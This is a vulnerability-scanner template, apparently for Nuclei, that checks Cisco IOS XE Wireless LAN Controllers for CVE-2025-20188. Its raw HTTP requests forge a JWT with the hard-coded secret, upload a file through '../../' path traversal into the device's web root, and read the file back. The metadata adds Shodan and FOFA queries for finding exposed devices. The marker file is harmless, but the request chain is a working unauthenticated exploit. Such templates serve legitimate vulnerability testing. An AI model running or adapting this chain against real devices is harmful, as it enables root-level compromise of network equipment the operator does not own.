flow: 'if (http(1)) {

  http(2) && http(3)

  }

  '
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 401
    - contains(body, 'invalid jwt string')
    internal: true
    type: dsl
  raw:
  - 'POST /ap_spec_rec/upload/ HTTP/1.1

    Host: {{Hostname}}

    Cookie: jwt={{randstr}}

    Content-Type: multipart/form-data; boundary=------------------------NCpI6tN3BZW3fz1Y9t2bkf

    Accept-Encoding: gzip


    --------------------------NCpI6tN3BZW3fz1Y9t2bkf

    Content-Disposition: form-data; name="file"; filename="../..{{path}}/{{filename}}.txt"

    Content-Type: text/plain


    {{string}}

    --------------------------NCpI6tN3BZW3fz1Y9t2bkf--

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(header, 'openresty')
    type: dsl
  raw:
  - 'POST /ap_spec_rec/upload/ HTTP/1.1

    Host: {{Hostname}}

    Cookie: jwt={{ generate_jwt(payload,"HS256",secret) }}

    Content-Type: multipart/form-data; boundary=------------------------NCpI6tN3BZW3fz1Y9t2bkf

    Accept-Encoding: gzip


    --------------------------NCpI6tN3BZW3fz1Y9t2bkf

    Content-Disposition: form-data; name="file"; filename="../../{{path}}{{filename}}.txt"

    Content-Type: text/plain


    {{string}}

    --------------------------NCpI6tN3BZW3fz1Y9t2bkf--

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, '{{string}}')
    type: dsl
  raw:
  - 'GET /{{filename}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2025-20188
info:
  author: iamnoooob,pdresearch,DhiyaneshDK
  classification:
    cve-id: CVE-2025-20188
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-798
    epss-percentile: 0.85882
    epss-score: 0.02888
  description: 'A vulnerability in the Out-of-Band Access Point (AP) Image Download
    feature of Cisco IOS XE Software for Wireless LAN Controllers (WLCs) could allow
    an unauthenticated, remote attacker to upload arbitrary files to an affected system.This
    vulnerability is due to the presence of a hard-coded JSON Web Token (JWT) on an
    affected system.An attacker could exploit this vulnerability by sending crafted
    HTTPS requests to the AP image download interface. A successful exploit could
    allow the attacker to upload files, perform path traversal, and execute arbitrary
    commands with root privileges.

    '
  impact: 'Unauthenticated attackers can exploit hard-coded JWT tokens to upload arbitrary
    files and execute commands with root privileges on Cisco IOS XE WLC devices, leading
    to complete device compromise and potential network-wide access.

    '
  metadata:
    fofa-query: '"IOS-Self-Signed-Certificate" && port="8443"'
    max-request: 2
    shodan-query: http.html_hash:1076109428 ssl.cert.issuer.cn:"IOS-Self-Signed-Certificate"
      port:8443
    verified: true
  name: Cisco IOS XE WLC - Arbitrary File Upload
  reference:
  - https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-wlc-file-uplpd-rHZG9UfC
  - https://horizon3.ai/attack-research/attack-blogs/cisco-ios-xe-wlc-arbitrary-file-upload-vulnerability-cve-2025-20188-analysis/
  remediation: 'Apply the patch provided in Cisco Security Advisory cisco-sa-wlc-file-uplpd-rHZG9UfC.

    '
  severity: critical
  tags: cve,cve2025,cisco,file-upload,intrusive,rce,vkev,vuln
variables:
  exp: '{{unix_time(10000)}}'
  filename: '{{randbase(8)}}'
  path: usr/binos/openresty/nginx/html/
  payload: '{"reqid":"cdb_token_request_id1","exp":{{exp}}}'
  secret: notfound
  string: '{{to_lower(''{{randstr}}'')}}'
